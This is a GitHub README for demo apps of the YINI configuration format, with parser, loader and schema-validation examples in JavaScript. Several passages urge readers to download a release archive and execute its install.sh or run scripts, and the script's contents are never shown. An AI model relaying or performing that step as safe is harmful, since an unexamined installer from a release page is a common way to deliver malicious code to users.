# YINI Demo Apps: Example INI-like Configs for Node.js Apps

[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/shuaixiang007/yini-demo-apps/releases)

A collection of example projects that show how to use YINI configuration files across environments. These apps demonstrate parsing, merging, validation, and runtime loading for Node.js, browser builds, and CLI tools.

Badges
- Topics: config, demo, examples, ini, javascript, json, nodejs, yini, yini-format, yini-parser
- License: MIT

Table of Contents
- Features
- What is YINI
- Repo layout
- Quick start
- Install and run (Releases)
- Examples
  - Node.js app
  - CLI loader
  - Browser demo
  - JSON output
- Format and schema
- Parser API examples
- Testing
- Contributing
- Changelog & Releases
- License

Features
- Small, human-friendly INI-like format for structured configs.
- Section nesting and arrays.
- Environment overrides for dev, staging, prod.
- Parser that outputs plain JavaScript objects and JSON.
- Demo apps that show common usage patterns.
- Examples for Node.js, CLI, and browser.

What is YINI
YINI is a simple INI-like format extended for nested structures and typed values. You can keep configs in plain text and load them into apps with minimal code. The demos here show parsing, merging environment files, and converting to JSON.

Repository layout
- apps/
  - node-app/        — Node.js demo showing runtime loading
  - cli-tool/        — Simple CLI that reads YINI and prints JSON
  - browser-demo/    — Static demo that loads config in the browser
- examples/
  - configs/         — Sample YINI files for dev, staging, prod
  - schemas/         — Example JSON schemas for validation
- lib/
  - parser.js        — Minimal YINI parser used in demos
  - loader.js        — Helper to merge env layers
- scripts/
  - build.sh
  - test.sh
- README.md
- LICENSE

Quick start

1) Clone and inspect the examples.
2) Use the parser in your app to load config files.
3) Merge environment files for overrides.

Install and run (Releases)
Download the packaged demo from the Releases page and run the installer script.

- Download the latest release asset from:
  https://github.com/shuaixiang007/yini-demo-apps/releases

- After download, extract the archive and execute the included installer or run script in the release asset. Example commands for a Unix system (replace filename with the real asset name you downloaded):

```
tar -xzf yini-demo-apps-1.0.0.tar.gz
cd yini-demo-apps-1.0.0
./install.sh
```

Find binary or scripts inside the release asset and run them to try the demos. You can also browse the Releases page to pick a specific tag:
https://github.com/shuaixiang007/yini-demo-apps/releases

If your environment blocks direct downloads, open the Releases section on GitHub and fetch the asset manually. The release includes sample apps, the parser, and a README for each demo.

Examples

Node.js app (Runtime loader)
- File: apps/node-app/index.js

Load a config with env overrides:

```js
const { loadYini } = require('../../lib/loader');

async function main() {
  // load base and env-level overrides
  const config = await loadYini({
    base: 'examples/configs/base.yini',
    env: process.env.NODE_ENV || 'development',
    envDir: 'examples/configs'
  });

  console.log('Effective config:', JSON.stringify(config, null, 2));
  // use config.server.port, config.db.url, etc.
}

main().catch(err => {
  console.error('Failed to load config', err);
  process.exit(1);
});
```

CLI loader (tools/cli-tool)
- File: apps/cli-tool/index.js

The CLI reads a YINI file and prints JSON or validates against a schema.

Usage:

```
node apps/cli-tool/index.js --file examples/configs/base.yini --format json
```

Output:
- JSON printed to stdout.
- Exit code non-zero on parse error or validation failure.

Browser demo (Static)
- File: apps/browser-demo/index.html

The browser demo loads a YINI file pre-parsed by a small JS parser. It demonstrates config-driven UI toggle and feature flags.

JSON output
- The parser exposes an option to write JSON files from YINI sources. Use this to generate environment-specific JSON for deployment.

Format and schema

YINI basic rules
- Key-value pairs separate with '=' or ':'.
- Sections use [section] and support subsections via dot notation: [server.database]
- Arrays use repeated keys or comma-separated values.
- Values parse into types: number, boolean, null when obvious.
- Comments: lines starting with ; or #.

Sample YINI

```
; base.yini
[server]
host = 0.0.0.0
port = 8080

[database]
url = postgres://user:pass@localhost:5432/appdb
pool = 10

[feature]
enableBeta = true
flags = a,b,c
```

Environment override pattern
- base.yini
- base.development.yini
- base.staging.yini
- base.production.yini

The loader merges files in order: base -> base.{env}.yini -> runtime overrides. Later values override earlier ones. Arrays merge by replacement unless otherwise configured.

Parser API examples

Basic parse
```js
const { parseYini } = require('./lib/parser');
const fs = require('fs');

const text = fs.readFileSync('examples/configs/base.yini', 'utf8');
const obj = parseYini(text);
console.log(obj.server.port); // 8080
```

Load and merge files
```js
const { loadYiniFiles } = require('./lib/loader');

async function load() {
  const final = await loadYiniFiles([
    'examples/configs/base.yini',
    'examples/configs/base.production.yini'
  ]);
  return final;
}
```

Validate against schema
```js
const Ajv = require('ajv');
const { parseYini } = require('./lib/parser');
const fs = require('fs');

const config = parseYini(fs.readFileSync('examples/configs/base.yini', 'utf8'));
const schema = JSON.parse(fs.readFileSync('examples/schemas/config.schema.json', 'utf8'));

const ajv = new Ajv();
const validate = ajv.compile(schema);
const ok = validate(config);
if (!ok) {
  console.error(validate.errors);
  process.exit(1);
}
```

Testing
- Unit tests live under tests/.
- Run tests with the included script in the release or via npm in the repo.

Local test run
```
npm install
npm test
```

Contributing
- Fork the repo.
- Create a branch for your feature or fix.
- Add tests for new behavior.
- Open a pull request against main.

Guidelines
- Keep the parser deterministic.
- Add an example app if you add a new feature.
- Use clear commit messages.

Changelog & Releases
- Each release bundles demo apps and the parser files.
- Download the release asset and run included scripts to try the examples.
- Releases: https://github.com/shuaixiang007/yini-demo-apps/releases

Because the releases page includes packaged files, download the artifact and execute any installer or run scripts included in that package to run demos. The release often contains a compressed archive and an install or run script.

Images and visual assets
- Hero image: https://raw.githubusercontent.com/shuaixiang007/yini-demo-apps/main/docs/yini-hero.png (if present in repo)
- Use badges from shields.io for download and npm info.

Suggested badges (examples)
- Download: [![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/shuaixiang007/yini-demo-apps/releases)
- Node version: [![Node](https://img.shields.io/badge/node-%3E%3D14-brightgreen)](https://nodejs.org/)
- License: [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

Why use these demos
- They show concrete patterns for environment-based config.
- They show how to keep config readable and versioned.
- They show migration path to JSON for build tooling.

Tips for production
- Keep secrets out of repo. Use environment or secret store.
- Use a schema for validation in CI.
- Use layered files to separate defaults and environment overrides.

Common scenarios

1) Local dev
- Use base.yini and base.development.yini.
- Load with loader and start server.

2) CI / build
- Convert YINI to JSON via the CLI and bundle JSON with the app.
- Use the CLI to validate before build step.

3) Container deploy
- Mount environment overrides at container start.
- Use a small startup script to merge configs from mounted files and env vars into a final JSON file.

Migration path (INI -> YINI)
- Replace flat key names with sections.
- Introduce nested keys using dot notation in sections.
- Add typed values where needed.
- Add environment files for overrides.

License
- MIT. See LICENSE file.

Contact and support
- Open issues or pull requests on GitHub.
- For releases and packaged demo downloads, visit:
  https://github.com/shuaixiang007/yini-demo-apps/releases

Files to look at first
- lib/parser.js — small parser you can adapt.
- lib/loader.js — merging and env handling.
- examples/configs/* — sample YINI files.
- apps/node-app — minimal server that uses the loader.